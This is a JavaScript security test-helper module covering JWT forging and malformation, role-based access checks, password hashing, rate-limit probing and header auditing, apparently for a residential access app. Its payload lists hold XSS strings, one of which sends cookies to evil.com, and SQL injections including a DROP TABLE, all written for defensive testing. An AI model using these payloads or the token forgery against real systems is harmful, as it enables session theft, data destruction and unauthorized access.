/**
 * Security Test Helpers
 * JWT manipulation, RBAC testing, rate limiting, and security test utilities
 */

import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

/**
 * JWT Token Helpers
 */

/**
 * Create test JWT token
 * @param {Object} payload - Token payload
 * @param {Object} options - Token options
 * @returns {string} JWT token
 */
export function createTestToken(payload = {}, options = {}) {
  const secret = options.secret || process.env.JWT_SECRET || 'test-secret';
  const expiresIn = options.expiresIn || '24h';

  const defaultPayload = {
    userId: payload.userId || 1,
    email: payload.email || 'test@test.com',
    role: payload.role || 'resident',
    ...payload
  };

  return jwt.sign(defaultPayload, secret, { expiresIn, ...options });
}

/**
 * Create expired JWT token
 * @param {Object} payload - Token payload
 * @returns {string} Expired JWT token
 */
export function createExpiredToken(payload = {}) {
  const secret = process.env.JWT_SECRET || 'test-secret';
  return jwt.sign(payload, secret, { expiresIn: '-1s' }); // Already expired
}

/**
 * Create malformed JWT token
 * @param {string} type - Type of malformation
 * @returns {string} Malformed token
 */
export function createMalformedToken(type = 'invalid_signature') {
  const validToken = createTestToken();
  const parts = validToken.split('.');

  switch (type) {
    case 'invalid_signature':
      return `${parts[0]}.${parts[1]}.invalidsignature`;
    
    case 'missing_signature':
      return `${parts[0]}.${parts[1]}.`;
    
    case 'missing_payload':
      return `${parts[0]}..${parts[2]}`;
    
    case 'missing_header':
      return `.${parts[1]}.${parts[2]}`;
    
    case 'invalid_format':
      return 'not.a.valid.jwt.token';
    
    case 'empty':
      return '';
    
    default:
      return validToken;
  }
}

/**
 * Decode JWT token without verification
 * @param {string} token - JWT token
 * @returns {Object} Decoded token
 */
export function decodeToken(token) {
  try {
    return jwt.decode(token, { complete: true });
  } catch (error) {
    return null;
  }
}

/**
 * Modify token payload
 * @param {string} token - Original token
 * @param {Object} modifications - Payload modifications
 * @returns {string} Modified token
 */
export function modifyTokenPayload(token, modifications) {
  const decoded = jwt.decode(token);
  if (!decoded) return null;

  const newPayload = { ...decoded, ...modifications };
  const secret = process.env.JWT_SECRET || 'test-secret';
  
  return jwt.sign(newPayload, secret, { expiresIn: '24h' });
}

/**
 * RBAC (Role-Based Access Control) Helpers
 */

/**
 * Role hierarchy
 */
export const ROLE_HIERARCHY = {
  admin: 4,
  guard: 3,
  resident: 2,
  visitor: 1
};

/**
 * Check if role has permission
 * @param {string} userRole - User's role
 * @param {string} requiredRole - Required role
 * @returns {boolean} Has permission
 */
export function hasPermission(userRole, requiredRole) {
  return (ROLE_HIERARCHY[userRole] || 0) >= (ROLE_HIERARCHY[requiredRole] || 0);
}

/**
 * Generate permission test cases
 * @param {string} requiredRole - Required role for action
 * @returns {Object} Test cases for all roles
 */
export function generatePermissionTestCases(requiredRole) {
  const roles = Object.keys(ROLE_HIERARCHY);
  
  return {
    allowed: roles.filter(role => hasPermission(role, requiredRole)),
    denied: roles.filter(role => !hasPermission(role, requiredRole)),
    testCases: roles.map(role => ({
      role,
      expected: hasPermission(role, requiredRole),
      token: createTestToken({ role })
    }))
  };
}

/**
 * Create authorization headers
 * @param {string} role - User role
 * @param {Object} payload - Additional token payload
 * @returns {Object} Headers object
 */
export function createAuthHeaders(role = 'resident', payload = {}) {
  const token = createTestToken({ role, ...payload });
  return {
    Authorization: `Bearer ${token}`,
    'Content-Type': 'application/json'
  };
}

/**
 * Password Security Helpers
 */

/**
 * Generate password hash
 * @param {string} password - Plain text password
 * @param {number} saltRounds - Bcrypt salt rounds
 * @returns {Promise<string>} Password hash
 */
export async function hashPassword(password, saltRounds = 10) {
  return await bcrypt.hash(password, saltRounds);
}

/**
 * Verify password
 * @param {string} password - Plain text password
 * @param {string} hash - Password hash
 * @returns {Promise<boolean>} Password matches
 */
export async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

/**
 * Generate test passwords
 * @returns {Object} Various password test cases
 */
export function generatePasswordTestCases() {
  return {
    valid: {
      strong: 'StrongPass123!@#',
      medium: 'MediumPass123',
      withSpecial: 'Pass!@#$%^&*()',
      long: 'A'.repeat(20) + '1!',
    },
    weak: {
      tooShort: 'Pass1!',
      noNumber: 'Password!',
      noSpecial: 'Password123',
      noUppercase: 'password123!',
      noLowercase: 'PASSWORD123!',
      common: 'Password123!',
    },
    invalid: {
      empty: '',
      whitespace: '   ',
      tooLong: 'A'.repeat(200),
      sqlInjection: "' OR '1'='1",
      xss: '<script>alert("XSS")</script>'
    }
  };
}

/**
 * Rate Limiting Helpers
 */

/**
 * Simulate rate limit test
 * @param {Function} apiCall - API call function
 * @param {number} limit - Rate limit threshold
 * @param {number} window - Time window in ms
 * @returns {Object} Rate limit test results
 */
export async function testRateLimit(apiCall, limit = 100, window = 60000) {
  const results = {
    requests: [],
    rateLimitHit: false,
    requestsBeforeLimit: 0,
    totalRequests: 0
  };

  const startTime = Date.now();

  for (let i = 0; i < limit + 10; i++) {
    const requestStart = Date.now();
    
    try {
      const response = await apiCall();
      results.requests.push({
        index: i,
        status: response.status,
        success: true,
        timestamp: requestStart
      });

      if (!results.rateLimitHit && response.status !== 429) {
        results.requestsBeforeLimit = i + 1;
      } else if (response.status === 429 && !results.rateLimitHit) {
        results.rateLimitHit = true;
      }
    } catch (error) {
      results.requests.push({
        index: i,
        status: error.response?.status,
        success: false,
        error: error.message,
        timestamp: requestStart
      });
    }

    results.totalRequests = i + 1;

    // Stop if rate limit hit and we've tested a few more requests
    if (results.rateLimitHit && i > results.requestsBeforeLimit + 5) {
      break;
    }

    // Stop if we've exceeded the time window
    if (Date.now() - startTime > window) {
      break;
    }
  }

  results.duration = Date.now() - startTime;
  results.requestsPerSecond = (results.totalRequests / results.duration) * 1000;

  return results;
}

/**
 * Generate rate limit test headers
 * @param {string} identifier - User/IP identifier
 * @returns {Object} Headers with rate limit identifiers
 */
export function generateRateLimitHeaders(identifier = 'test-user') {
  return {
    'X-Forwarded-For': identifier,
    'X-Real-IP': identifier,
    'User-Agent': 'RateLimit-Test-Client/1.0'
  };
}

/**
 * XSS/CSRF Protection Helpers
 */

/**
 * Generate XSS test payloads
 * @returns {Array} XSS test payloads
 */
export function generateXSSPayloads() {
  return [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<svg/onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>'
  ];
}

/**
 * Generate SQL injection test payloads
 * @returns {Array} SQL injection payloads
 */
export function generateSQLInjectionPayloads() {
  return [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--"
  ];
}

/**
 * Validate input sanitization
 * @param {string} input - Input to test
 * @param {string} sanitized - Sanitized output
 * @returns {Object} Validation result
 */
export function validateSanitization(input, sanitized) {
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /onerror=/i,
    /onload=/i,
    /<iframe/i,
    /DROP\s+TABLE/i,
    /UNION\s+SELECT/i,
    /;\s*DROP/i
  ];

  const stillDangerous = dangerousPatterns.some(pattern => pattern.test(sanitized));

  return {
    wasDangerous: dangerousPatterns.some(pattern => pattern.test(input)),
    nowSafe: !stillDangerous,
    input,
    sanitized,
    passed: !stillDangerous
  };
}

/**
 * Security Audit Helpers
 */

/**
 * Check for common security headers
 * @param {Object} headers - Response headers
 * @returns {Object} Security headers analysis
 */
export function checkSecurityHeaders(headers) {
  const requiredHeaders = {
    'Content-Security-Policy': false,
    'X-Content-Type-Options': false,
    'X-Frame-Options': false,
    'X-XSS-Protection': false,
    'Strict-Transport-Security': false,
    'Referrer-Policy': false
  };

  Object.keys(requiredHeaders).forEach(header => {
    requiredHeaders[header] = !!headers[header.toLowerCase()];
  });

  const present = Object.values(requiredHeaders).filter(Boolean).length;
  const total = Object.keys(requiredHeaders).length;

  return {
    headers: requiredHeaders,
    score: (present / total) * 100,
    present,
    missing: total - present,
    passed: present === total
  };
}

/**
 * Assert security requirement
 * @param {boolean} condition - Security condition to check
 * @param {string} requirement - Security requirement description
 * @throws {Error} If security requirement not met
 */
export function assertSecurity(condition, requirement) {
  if (!condition) {
    throw new Error(`Security requirement not met: ${requirement}`);
  }
}

// Export all helpers
export default {
  // JWT helpers
  createTestToken,
  createExpiredToken,
  createMalformedToken,
  decodeToken,
  modifyTokenPayload,
  
  // RBAC helpers
  ROLE_HIERARCHY,
  hasPermission,
  generatePermissionTestCases,
  createAuthHeaders,
  
  // Password helpers
  hashPassword,
  verifyPassword,
  generatePasswordTestCases,
  
  // Rate limiting helpers
  testRateLimit,
  generateRateLimitHeaders,
  
  // XSS/CSRF helpers
  generateXSSPayloads,
  generateSQLInjectionPayloads,
  validateSanitization,
  
  // Security audit helpers
  checkSecurityHeaders,
  assertSecurity
};
